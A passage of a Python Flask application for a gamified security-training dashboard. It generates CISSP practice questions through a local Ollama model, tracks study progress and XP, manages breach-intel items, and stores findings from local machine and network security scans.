{{"scenario":"<3-5 sentence realistic scenario>","question":"<question asking FIRST or BEST action>","options":{{"A":"<option>","B":"<option>","C":"<option>","D":"<option>"}},"correct":"<A|B|C|D>","explanation":"<2-3 sentences: why the correct answer is best AND why the others are wrong>","mindset":"<manager|technical|both>","difficulty":<1|2|3>}}"""

    ollama_base  = os.environ.get("OLLAMA_BASE_URL", "http://localhost:11434/v1")
    ollama_model = os.environ.get("OLLAMA_MODEL",    "llama3.1:8b")
    try:
        payload = _j.dumps({
            "model":       ollama_model,
            "messages":    [{"role": "user", "content": prompt}],
            "max_tokens":  900,
            "temperature": 0.75,
        }).encode()
        req = _urlreq.Request(
            f"{ollama_base}/chat/completions",
            data=payload,
            headers={"Content-Type": "application/json"},
        )
        with _urlreq.urlopen(req, timeout=90) as resp:
            raw  = _j.loads(resp.read())
            text = raw["choices"][0]["message"]["content"].strip()
            text = re.sub(r"^```[a-z]*\n?", "", text).rstrip("`").strip()
            q    = _j.loads(text)
            # Validate required structure
            required = ["scenario", "question", "options", "correct", "explanation", "mindset", "difficulty"]
            if not all(k in q for k in required):
                security_log.warning(f"CISSP_Q_MISSING_FIELDS domain={domain_num} keys={list(q.keys())}")
                return None
            if set(q["options"].keys()) != {"A", "B", "C", "D"}:
                return None
            if q["correct"] not in ("A", "B", "C", "D"):
                return None
            if q["mindset"] not in ("manager", "technical", "both"):
                q["mindset"] = "manager"
            q["difficulty"] = max(1, min(3, int(q.get("difficulty", 2))))
            return q
    except Exception as exc:
        security_log.warning(f"CISSP_Q_GENERATION_FAILED domain={domain_num} error={exc}")
        return None


def _cissp_readiness_score(analyst_id):
    """
    Calculate a 0–1000 readiness score weighted by each domain's CISSP exam %.
    Only domains with ≥5 attempts contribute. Returns 0 if no data yet.
    """
    rows = db_fetchall(
        f"SELECT domain_num, attempts, correct FROM cissp_progress WHERE analyst_id = {PH}",
        (analyst_id,),
    )
    weighted_sum  = 0.0
    active_weight = 0
    for row in rows:
        d   = row["domain_num"]
        att = row["attempts"] or 0
        cor = row["correct"]  or 0
        if att < 5:
            continue
        domain_weight = CISSP_DOMAINS.get(d, {}).get("weight", 13)
        weighted_sum  += (cor / att) * domain_weight
        active_weight += domain_weight
    if active_weight == 0:
        return 0
    return round((weighted_sum / active_weight) * 1000)


# ── CISSP Routes ─────────────────────────────────────────────────────────────

@app.route("/cissp")
@analyst_required
def cissp_hub():
    """CISSP Study Hub — 8-domain progress overview, readiness score, daily goal."""
    analyst_id = session["user_id"]

    progress_rows = db_fetchall(
        f"SELECT domain_num, attempts, correct, last_studied_at FROM cissp_progress WHERE analyst_id = {PH}",
        (analyst_id,),
    )
    progress = {r["domain_num"]: r for r in progress_rows}

    today = datetime.utcnow().strftime("%Y-%m-%d")
    today_row = db_fetchone(
        f"SELECT COUNT(*) AS cnt FROM cissp_attempts "
        f"WHERE analyst_id = {PH} AND skipped = 0 AND is_correct IS NOT NULL "
        f"AND created_at LIKE {PH}",
        (analyst_id, f"{today}%"),
    )
    today_count = today_row["cnt"] if today_row else 0

    total_row = db_fetchone(
        f"SELECT COUNT(*) AS cnt FROM cissp_attempts "
        f"WHERE analyst_id = {PH} AND is_correct IS NOT NULL AND skipped = 0",
        (analyst_id,),
    )
    total_answered = total_row["cnt"] if total_row else 0

    readiness_score = _cissp_readiness_score(analyst_id)
    domains_studied  = sum(1 for p in progress_rows if (p["attempts"] or 0) >= 1)
    player           = get_player_profile(analyst_id)

    return render_template(
        "cissp_hub.html",
        cissp_domains=CISSP_DOMAINS,
        progress=progress,
        today_count=today_count,
        total_answered=total_answered,
        readiness_score=readiness_score,
        domains_studied=domains_studied,
        daily_goal=15,
        player=player,
    )


@app.route("/cissp/domain/<int:domain_num>")
@analyst_required
def cissp_domain(domain_num):
    """Domain-specific study page — shows progress, generates questions via AJAX."""
    import json as _json
    if domain_num not in CISSP_DOMAINS:
        abort(404)

    analyst_id = session["user_id"]
    domain     = CISSP_DOMAINS[domain_num]

    progress = db_fetchone(
        f"SELECT attempts, correct, last_studied_at FROM cissp_progress "
        f"WHERE analyst_id = {PH} AND domain_num = {PH}",
        (analyst_id, domain_num),
    )
    if not progress:
        progress = {"attempts": 0, "correct": 0, "last_studied_at": None}

    today = datetime.utcnow().strftime("%Y-%m-%d")
    session_attempts = db_fetchall(
        f"SELECT id, scenario, question_text, options_json, correct_answer, user_answer, "
        f"explanation, mindset, difficulty, is_correct, skipped "
        f"FROM cissp_attempts "
        f"WHERE analyst_id = {PH} AND domain_num = {PH} AND created_at LIKE {PH} "
        f"AND skipped = 0 AND is_correct IS NOT NULL "
        f"ORDER BY id DESC LIMIT 10",
        (analyst_id, domain_num, f"{today}%"),
    )
    parsed = []
    for a in session_attempts:
        a = dict(a)
        try:
            a["options"] = _json.loads(a["options_json"])
        except Exception:
            a["options"] = {}
        parsed.append(a)

    player = get_player_profile(analyst_id)
    return render_template(
        "cissp_domain.html",
        domain=domain,
        domain_num=domain_num,
        progress=progress,
        session_attempts=parsed,
        cissp_domains=CISSP_DOMAINS,
        player=player,
    )


@app.route("/cissp/domain/<int:domain_num>/question", methods=["POST"])
@analyst_required
def cissp_get_question(domain_num):
    """
    AJAX — generate a fresh AI-powered CISSP question.
    Correct answer is stored in DB but NOT returned to the browser.
    """
    import json as _json
    if domain_num not in CISSP_DOMAINS:
        return jsonify({"error": "Invalid domain"}), 404

    analyst_id = session["user_id"]
    q          = _generate_cissp_question(domain_num)
    if not q:
        return jsonify({"error": "Question generation failed. Is Ollama running at http://localhost:11434?"}), 503

    db_run(
        f"INSERT INTO cissp_attempts "
        f"(analyst_id, domain_num, scenario, question_text, options_json, "
        f" correct_answer, explanation, mindset, difficulty) "
        f"VALUES ({PH},{PH},{PH},{PH},{PH},{PH},{PH},{PH},{PH})",
        (
            analyst_id, domain_num,
            q["scenario"], q["question"],
            _json.dumps(q["options"]),
            q["correct"], q["explanation"],
            q["mindset"], q["difficulty"],
        ),
    )
    attempt_id = db_fetchone(
        f"SELECT MAX(id) AS aid FROM cissp_attempts WHERE analyst_id = {PH} AND domain_num = {PH}",
        (analyst_id, domain_num),
    )["aid"]

    return jsonify({
        "attempt_id": attempt_id,
        "scenario":   q["scenario"],
        "question":   q["question"],
        "options":    q["options"],
        "mindset":    q["mindset"],
        "difficulty": q["difficulty"],
    })


@app.route("/cissp/domain/<int:domain_num>/answer", methods=["POST"])
@analyst_required
def cissp_submit_answer(domain_num):
    """AJAX — score a submitted answer and return feedback."""
    import json as _json
    analyst_id  = session["user_id"]
    data        = request.get_json(force=True, silent=True) or {}
    attempt_id  = data.get("attempt_id")
    user_answer = str(data.get("answer", "")).upper().strip()

    if not attempt_id or user_answer not in ("A", "B", "C", "D"):
        return jsonify({"error": "Invalid request"}), 400

    attempt = db_fetchone(
        f"SELECT * FROM cissp_attempts WHERE id = {PH} AND analyst_id = {PH} AND domain_num = {PH}",
        (attempt_id, analyst_id, domain_num),
    )
    if not attempt:
        return jsonify({"error": "Attempt not found"}), 404
    if attempt["user_answer"] is not None:
        return jsonify({"error": "Already answered"}), 400

    correct    = attempt["correct_answer"]
    is_correct = int(user_answer == correct)
    now_str    = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

    db_run(
        f"UPDATE cissp_attempts SET user_answer = {PH}, is_correct = {PH} WHERE id = {PH}",
        (user_answer, is_correct, attempt_id),
    )

    existing_progress = db_fetchone(
        f"SELECT id FROM cissp_progress WHERE analyst_id = {PH} AND domain_num = {PH}",
        (analyst_id, domain_num),
    )
    if existing_progress:
        db_run(
            f"UPDATE cissp_progress SET attempts = attempts + 1, correct = correct + {PH}, "
            f"last_studied_at = {PH} WHERE analyst_id = {PH} AND domain_num = {PH}",
            (is_correct, now_str, analyst_id, domain_num),
        )
    else:
        db_run(
            f"INSERT INTO cissp_progress (analyst_id, domain_num, attempts, correct, last_studied_at) "
            f"VALUES ({PH},{PH},1,{PH},{PH})",
            (analyst_id, domain_num, is_correct, now_str),
        )

    try:
        options = _json.loads(attempt["options_json"])
    except Exception:
        options = {}

    # Award XP — correct gets 10, any attempt gets 2
    xp_amount = XP_REWARDS["cissp_correct"] if is_correct else XP_REWARDS["cissp_attempt"]
    xp_result = award_xp(
        analyst_id, xp_amount,
        reason=f"CISSP D{domain_num} {'correct' if is_correct else 'attempt'}",
        source="cissp",
    )

    return jsonify({
        "correct":              bool(is_correct),
        "correct_answer":       correct,
        "correct_answer_text":  options.get(correct, ""),
        "explanation":          attempt["explanation"],
        "xp":                   xp_result,
    })


@app.route("/cissp/domain/<int:domain_num>/skip", methods=["POST"])
@analyst_required
def cissp_skip_question(domain_num):
    """AJAX — skip a question (no progress penalty, generates a fresh one)."""
    analyst_id = session["user_id"]
    data       = request.get_json(force=True, silent=True) or {}
    attempt_id = data.get("attempt_id")
    if not attempt_id:
        return jsonify({"error": "Missing attempt_id"}), 400
    db_run(
        f"UPDATE cissp_attempts SET skipped = 1 WHERE id = {PH} AND analyst_id = {PH}",
        (attempt_id, analyst_id),
    )
    return jsonify({"ok": True})


# --- ROUTE 8c: Breach Intel — Dismiss / Archive / Unarchive (analyst only) ---

@app.route("/breach-intel/<int:item_id>/dismiss", methods=["POST"])
@analyst_required
def breach_intel_dismiss(item_id):
    """Mark an intel item as dismissed so it no longer appears in the feed/ticker."""
    db_run(f"UPDATE breach_intel SET dismissed = 1 WHERE id = {PH}", (item_id,))
    return jsonify({"ok": True})


@app.route("/breach-intel/<int:item_id>/archive", methods=["POST"])
@analyst_required
def breach_intel_archive(item_id):
    """Move an intel item to the archive (dismissed from feed, saved for reference)."""
    db_run(f"UPDATE breach_intel SET archived = 1, dismissed = 1 WHERE id = {PH}", (item_id,))
    return jsonify({"ok": True})


@app.route("/breach-intel/<int:item_id>/unarchive", methods=["POST"])
@analyst_required
def breach_intel_unarchive(item_id):
    """Restore an archived item back to the active feed."""
    db_run(f"UPDATE breach_intel SET archived = 0, dismissed = 0 WHERE id = {PH}", (item_id,))
    return jsonify({"ok": True})


# --- ROUTE: Player Profile ---

@app.route("/profile")
@analyst_required
def player_profile_page():
    """RPG profile page — XP history, level, badges, stats."""
    analyst_id = session["user_id"]
    player     = get_player_profile(analyst_id)

    # XP log — last 30 transactions
    xp_history = db_fetchall(
        f"SELECT amount, reason, source, created_at FROM xp_log "
        f"WHERE analyst_id = {PH} ORDER BY id DESC LIMIT 30",
        (analyst_id,),
    )

    # Full achievement grid: earned + locked
    earned_ids = set(player["badges"])
    all_badges = [
        {
            "badge_id": bid,
            "earned":   bid in earned_ids,
            **data,
        }
        for bid, data in ACHIEVEMENTS.items()
    ]

    # Per-domain CISSP stats
    domain_stats = {}
    for d in range(1, 9):
        row = db_fetchone(
            f"SELECT attempts, correct FROM cissp_progress "
            f"WHERE analyst_id = {PH} AND domain_num = {PH}",
            (analyst_id, d),
        )
        domain_stats[d] = row if row else {"attempts": 0, "correct": 0}

    readiness_score = _cissp_readiness_score(analyst_id)

    return render_template(
        "player_profile.html",
        player=player,
        xp_history=xp_history,
        all_badges=all_badges,
        domain_stats=domain_stats,
        cissp_domains=CISSP_DOMAINS,
        readiness_score=readiness_score,
        level_thresholds=LEVEL_THRESHOLDS,
    )


# --- ROUTE: Player XP state (AJAX — used by topbar) ---

@app.route("/player/xp")
@analyst_required
def player_xp_state():
    """Return current XP, level, and streak for the topbar XP bar."""
    analyst_id = session["user_id"]
    player     = get_player_profile(analyst_id)
    return jsonify({
        "xp":          player["xp"],
        "level":       player["level"],
        "level_name":  player["level_name"],
        "level_icon":  player["level_icon"],
        "level_pct":   player["level_pct"],
        "xp_to_next":  player["xp_to_next"],
        "streak":      player["streak_days"],
    })


# --- ROUTE: System Scanner ---

@app.route("/scan/machine", methods=["POST"])
@analyst_required
def scan_machine():
    """
    Run a real Windows 11 security audit on the local machine.
    Calls system_scanner.py to enumerate firewall, users, open ports,
    Defender, UAC, updates, shared folders. Stores findings in DB.
    Awards XP for running the scan.
    """
    import json as _json
    try:
        from system_scanner import run_machine_audit
        findings = run_machine_audit()
    except Exception as exc:
        security_log.warning(f"SCAN_MACHINE_FAILED error={exc}")
        return jsonify({"error": f"Scan failed: {exc}"}), 500

    analyst_id = session["user_id"]
    saved = 0
    for f in findings:
        # Check if this finding_id already exists unresolved
        existing = db_fetchone(
            f"SELECT id FROM system_findings WHERE finding_id = {PH} AND resolved = 0",
            (f["finding_id"],),
        )
        if not existing:
            db_run(
                f"INSERT INTO system_findings "
                f"(finding_id, title, severity, cissp_domain, category, description, recommendation, raw_output, scan_type) "
                f"VALUES ({PH},{PH},{PH},{PH},{PH},{PH},{PH},{PH},{PH})",
                (
                    f["finding_id"], f["title"], f["severity"], f["cissp_domain"],
                    f.get("category", ""), f["description"], f["recommendation"],
                    f.get("raw_output", ""), "machine",
                ),
            )
            saved += 1

    # Increment scan counter on player profile
    db_run(
        f"UPDATE player_profile SET total_scans = total_scans + 1 WHERE analyst_id = {PH}",
        (analyst_id,),
    )

    xp_result = award_xp(analyst_id, XP_REWARDS["scan_run"], "Machine security scan", "scanner")

    return jsonify({
        "ok":          True,
        "findings":    len(findings),
        "new_saved":   saved,
        "xp":          xp_result,
    })


@app.route("/scan/network", methods=["POST"])
@analyst_required
def scan_network():
    """
    Discover devices on the local network and scan top ports.
    Stores findings for any risky open services found.
    Awards XP for running the scan.
    """
    import json as _json
    try:
        from system_scanner import run_network_scan
        findings = run_network_scan()
    except Exception as exc:
        security_log.warning(f"SCAN_NETWORK_FAILED error={exc}")
        return jsonify({"error": f"Scan failed: {exc}"}), 500

    analyst_id = session["user_id"]
    saved = 0
    for f in findings:
        existing = db_fetchone(
            f"SELECT id FROM system_findings WHERE finding_id = {PH} AND resolved = 0",
            (f["finding_id"],),
        )
        if not existing:
            db_run(
                f"INSERT INTO system_findings "
                f"(finding_id, title, severity, cissp_domain, category, description, recommendation, raw_output, scan_type) "
                f"VALUES ({PH},{PH},{PH},{PH},{PH},{PH},{PH},{PH},{PH})",
                (
                    f["finding_id"], f["title"], f["severity"], f["cissp_domain"],
                    f.get("category", ""), f["description"], f["recommendation"],
                    f.get("raw_output", ""), "network",
                ),
            )
            saved += 1

    db_run(
        f"UPDATE player_profile SET total_scans = total_scans + 1 WHERE analyst_id = {PH}",
        (analyst_id,),
    )

    xp_result = award_xp(analyst_id, XP_REWARDS["scan_run"], "Network scan", "scanner")

    return jsonify({
        "ok":          True,
        "findings":    len(findings),
        "new_saved":   saved,
        "xp":          xp_result,
    })


@app.route("/scan/findings")
@analyst_required
def scan_findings():
    """AJAX — return all open system findings as JSON."""
    findings = db_fetchall(
        "SELECT id, finding_id, title, severity, cissp_domain, category, "
        "description, recommendation, scan_type, created_at "
        "FROM system_findings WHERE resolved = 0 ORDER BY id DESC"
    )
    return jsonify(findings)


@app.route("/scan/findings/<int:finding_id>/resolve", methods=["POST"])
@analyst_required
def resolve_finding(finding_id):
    """
    Mark a system finding as resolved.
    Awards XP and checks for Fixer achievement.
    """
    analyst_id = session["user_id"]
    now_str    = datetime.utcnow().strftime("%Y-%m-%d %H:%M:%S")

    finding = db_fetchone(
        f"SELECT id, title, cissp_domain FROM system_findings "
        f"WHERE id = {PH} AND resolved = 0",
        (finding_id,),
    )
    if not finding:
        return jsonify({"error": "Finding not found or already resolved"}), 404

    db_run(
        f"UPDATE system_findings SET resolved = 1, resolved_at = {PH} WHERE id = {PH}",
        (now_str, finding_id),
    )
    db_run(
        f"UPDATE player_profile SET total_findings_resolved = total_findings_resolved + 1 "
        f"WHERE analyst_id = {PH}",
        (analyst_id,),
    )

    xp_result = award_xp(
        analyst_id, XP_REWARDS["finding_resolved"],
        f"Resolved: {finding['title'][:60]}", "scanner",
    )

    return jsonify({"ok": True, "xp": xp_result})


# --- Startup ---
# init_db() must run at module level so gunicorn (production) initialises
# the database on import, not just when running via `python app.py`.
init_db()

if __name__ == "__main__":
    app.run(debug=_debug)
